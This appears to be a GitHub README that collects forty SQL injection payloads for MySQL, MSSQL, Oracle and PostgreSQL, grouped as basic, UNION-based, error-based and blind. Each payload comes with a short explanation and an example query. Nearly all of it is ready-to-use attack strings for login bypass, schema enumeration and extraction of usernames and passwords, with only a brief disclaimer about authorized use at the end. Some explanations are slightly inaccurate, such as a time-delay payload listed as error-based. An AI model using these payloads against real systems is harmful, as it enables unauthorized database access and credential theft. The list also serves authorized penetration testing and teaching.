![image-122](https://github.com/user-attachments/assets/99af8af7-3084-4fe9-8940-1ec7c8f8eb4d)

## SQLi-Sample-Payloads

Here are 10 prominent SQL injection (SQLi) payloads for each technique—Basic, Union-Based, Error-Based, and Blind SQLi—each with explanation and an example. These payloads are typical across MySQL, MSSQL, Oracle, and PostgreSQL targets.

## 1. Basic SQL Injection Payloads
These aim to manipulate input parameters to alter query logic, often for login bypass or data extraction.

1.>> ' OR '1'='1'--
   - Bypasses authentication by making the WHERE clause always true.
   - `SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = ''`

2.>> ' OR 1=1--
   - A variant for numeric fields, always returns true.
   - `SELECT * FROM data WHERE id = '1 OR 1=1--'`

3.>> ' OR 'a'='a
   - Alternative for non-numeric fields; always true.
   - `SELECT * FROM items WHERE name = '' OR 'a'='a'`

4.>> admin'--
   - Comments out rest of the query, possibly logging in as admin.
   - `SELECT * FROM users WHERE username = 'admin'--'`

5.>> ' OR 1=1#
   - MySQL-specific inline comment version.
   - `SELECT * FROM products WHERE id = '' OR 1=1#`

6.>> ' OR '' = '
   - Makes the condition always true on loosely validated fields.
   - `SELECT * FROM site WHERE info = '' OR '' = ''`

7.>> " OR "" = "
   - Double-quote variant for systems using " as string delimiter.
   - `SELECT * FROM posts WHERE text = "" OR "" = ""`

8.>> ' OR TRUE--
   - Explicitly invokes boolean TRUE.
   - `SELECT * FROM users WHERE id = '' OR TRUE--`

9.>> ' or sleep(5)--
   - Creates a delay to reveal SQLi via timing.
   - `SELECT * FROM products WHERE id = '' or sleep(5)--`

10.>> ') OR ('1'='1'--
    - Payload works in complex or nested queries.
    - `SELECT * FROM records WHERE (title = '') OR ('1'='1'--')`

## 2. Union-Based SQLi Payloads
Exploit the UNION operator to combine normal query results with data from other tables.

1.>> ' UNION SELECT null,null--
   - Initial check for column count alignment.
   - `SELECT * FROM news WHERE id='' UNION SELECT null, null--`

2.>> ' UNION SELECT username, password FROM users--
   - Leverages known table/column names to fetch sensitive data.
   - `SELECT * FROM logins WHERE id='' UNION SELECT username, password FROM users--`

3.>> ' UNION ALL SELECT 1,2,3--
   - Used to map column ordering and visibility in output.
   - `SELECT * FROM entries WHERE id='' UNION ALL SELECT 1,2,3--`

4.>> ' UNION SELECT table_name, null FROM information_schema.tables--
   - Reveals schema info (MySQL).
   - `SELECT * FROM x WHERE id='' UNION SELECT table_name, null FROM information_schema.tables--`

5.>> ' UNION SELECT null, version()--
   - Retrieves database version (Postgres/MySQL).
   - `SELECT * FROM y WHERE id='' UNION SELECT null, version()--`

6.>> ' UNION SELECT user(), database()--
   - Retrieves current DB user and DB name.
   - `SELECT * FROM a WHERE id='' UNION SELECT user(), database()--`

7.>> ' UNION SELECT @@hostname, @@datadir--
   - Reads MySQL host and data directory.
   - `SELECT * FROM site WHERE id='' UNION SELECT @@hostname, @@datadir--`

8.>> ' UNION SELECT 1, table_name FROM all_tables--
   - For Oracle; lists table names.
   - `SELECT * FROM users WHERE id='' UNION SELECT 1, table_name FROM all_tables--`

9.>> ' UNION SELECT null, password FROM members--
   - Accesses password field in another table.
   - `SELECT * FROM data WHERE id='' UNION SELECT null, password FROM members--`

10.>> ' UNION SELECT 1, group_concat(username, ':', password) FROM users--
    - Concatenates results for larger data leaks.
    - `SELECT * FROM temp WHERE id='' UNION SELECT 1, group_concat(username, ':', password) FROM users--`

## 3. Error-Based SQL Injection Payloads
Trigger database errors to reveal information via error messages.

1.>> '
   - Syntax error triggers DB error with query details.
   - Input: `'` → Error: syntax error at or near '...'

2.>> 1/0
   - Forces division by zero to provoke error.
   - `SELECT * FROM posts WHERE id=1/0`

3.>> ' AND updatexml(1,concat(0x7e,(SELECT version())),0)--
   - MySQL: Forces error to display DB version.
   - Input: `' AND updatexml(1,concat(0x7e,(SELECT version())),0)--`

4.>> ' AND extractvalue(1,concat(0x7e,(SELECT user())))--
   - MySQL: Triggers error with current DB user.
   - Input: `' AND extractvalue(1,concat(0x7e,(SELECT user())))--`

5.>> ' and (select 1 from (select count(*),concat((select database()),0x3a,floor(rand(0)*2)) x from information_schema.tables group by x)a)--
   - Duplicated entry error leaks DB name.

6.>> ' AND 1=CAST((SELECT @@version) AS INT)--
   - MSSQL/PGSQL: Type casting error for version info.

7.>> ' AND CONVERT(INT, (SELECT @@version))=1--
   - Another type conversion error for MSSQL, version leak.

8.>> ' LIMIT 1 OFFSET 9999999999--
   - Triggers "out of range" or similar errors, may reveal schema.

9.>> ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
   - Leverages errors in sub-select/context.

10.>> '||(SELECT version())||'
    - ORACLE: Causes error concatenating with DB version.

## 4. Blind SQL Injection Payloads
Exploits where no output or errors are shown, but true/false or timing differences can be observed.

1.>> 1' AND 1=1--
   - Page loads normally (condition true).

2.>> 1' AND 1=2--
   - Logic false, page content/behavior changes.

3.>> 1 AND SLEEP(5)
   - Time-based: If vuln, response takes 5 extra seconds.

4.>> 1' AND SUBSTRING((SELECT database()),1,1)='a'--
   - Tests if first DB name character is 'a'; iterate to extract data.

5.>> 1' AND ASCII(SUBSTRING((SELECT user()),1,1))=97--
   - Extracts ASCII values of user name char-by-char.

6.>> 1' AND LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1))=5--
   - Checks table name length for further guessing.

7.>> 1' AND EXISTS(SELECT * FROM users WHERE username='admin')--
   - Checks for presence of admin user.

8.>> 1' AND (SELECT count(*) FROM users)>10--
   - Determines number of users above a threshold.

9.>> 1'; IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)--
   - Conditional time delay to brute-force info.

10.>> '||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)-- (Oracle)
    - Causes error if condition true; no error otherwise.

# Many more payloads exist, customized for target DBMS and context. For further resources, curated lists like PortSwigger's cheat sheet are recommended.
 >>(*^=^**)Note: Use these only in legal, authorized environments—SQL injection is illegal without proper consent.(**^=^*)

1> https://github.com/payloadbox/sql-injection-payload-list

2> https://github.com/topics/sql-injection-payloads

3> https://portswigger.net/web-security/sql-injection/cheat-sheet

4> https://www.hackerone.com/blog/breaking-down-owasp-top-10-injection
